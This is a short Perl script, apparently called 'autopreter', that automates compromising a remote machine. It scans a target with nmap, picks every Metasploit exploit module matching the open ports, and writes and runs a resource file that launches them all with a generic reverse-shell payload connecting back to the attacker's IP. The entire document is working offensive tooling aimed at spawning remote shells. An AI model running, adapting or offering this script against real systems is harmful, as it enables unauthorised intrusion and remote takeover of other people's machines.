#!/usr/bin/perl
print("autopreter by oxagast\n");
if($#ARGV < 1) {
  print("Useage: ./autopreter.pl <remoteip> <yourip>\n\n");
  print("  If you can't get a shell, your firewall may be blocking it\n");
  print("  Please allow 15 minutes for the process to complete...\n");
  print("  Once sessions are displayed, if you have an active session\n");
  print("  type sessions 1\n");
  exit(1);
}
if(`id` !~ m/root/) {
  print("Must be run as root on the local machine.\n");
  exit(1);
}
$lhost = @ARGV[1];
$rhost = @ARGV[0];
print("trying to spawn a shell from $rhost...\n");
unlink("masspwn.nmap");
unlink("masspwn.msf");
system("nmap $rhost -O -oG masspwn.nmap >/dev/null");
$nms = `cat masspwn.nmap`;
@nmap = split("\n", $nms);
@nmap[1] =~ m/Host: (\d+\.\d+\.\d+\.\d+)/;
$rhost = $1;
@port = split("/open", @nmap[2]);
@port[0] =~ s/.*Ports: //;
push(@nport, @port[0]);
foreach (@port) {
  $_ =~ m/.*, (\d+)/;
  push(@nport, $1);
}
foreach(@nport) {
  $curport = $_;
  @moduledir = `grep RPORT modules/ -R | grep \\($curport\\) | grep exploit`;
  foreach(@moduledir) {
    $curmod = $_;
    $curmod =~ m/.*\/(exploit.*)\.rb\:.*/;
    push(@modules, $1);
  }
}
my %seen;
foreach my $value (@modules) {
  if (! $seen{$value}) {
    push @umods, $value;
    $seen{$value} = 1;
  }
}
@nmap[2] =~ m/.*OS: (\w+) /;
$os = $1;
$los = lc($os);
$handler = 2000;;
open($fh, ">", "masspwn.msf");
foreach(@umods) {
  $handler++;
  print($fh "use $_\n");
  print($fh "set RHOST $rhost\n");
  print($fh "set LHOST $lhost\n");
  print($fh "set LPORT $handler\n");
  print($fh "set ExitOnSession false\n");
  print($fh "set PAYLOAD generic_shell_reverse\n");
  print($fh "exploit -j -z\n");
}
print($fh "jobs -K\n");
print($fh "sessions\n");

system("./msfconsole -r masspwn.msf");
exit(0);
